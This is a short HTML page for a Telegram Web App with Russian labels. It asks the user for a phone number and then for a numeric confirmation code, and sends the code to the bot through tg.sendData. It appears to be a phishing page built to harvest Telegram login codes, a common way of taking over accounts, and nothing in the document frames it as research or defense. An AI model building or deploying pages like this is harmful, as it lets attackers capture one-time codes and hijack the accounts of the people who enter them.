<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        .step { display: none; }
        .step.active { display: block; }
    </style>
</head>
<body>
    <div id="app">
        <div id="step-phone" class="step active">
            <h3>Введите номер</h3>
            <input type="tel" id="phone" placeholder="+7..." />
            <button onclick="nextStep('phone')">Далее</button>
        </div>

        <div id="step-code" class="step">
            <h3>Введите код</h3>
            <input type="number" id="code" placeholder="12345" />
            <button onclick="nextStep('code')">Подтвердить</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();

        async function nextStep(type) {
            const val = document.getElementById(type).value;
            
            console.log("Отправка " + type + ": " + val);

            if(type === 'phone') {
                showStep('code');
            } else {
                tg.sendData(val);
            }
        }

        function showStep(id) {
            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
            document.getElementById('step-' + id).classList.add('active');
        }
    </script>
</body>
</html>
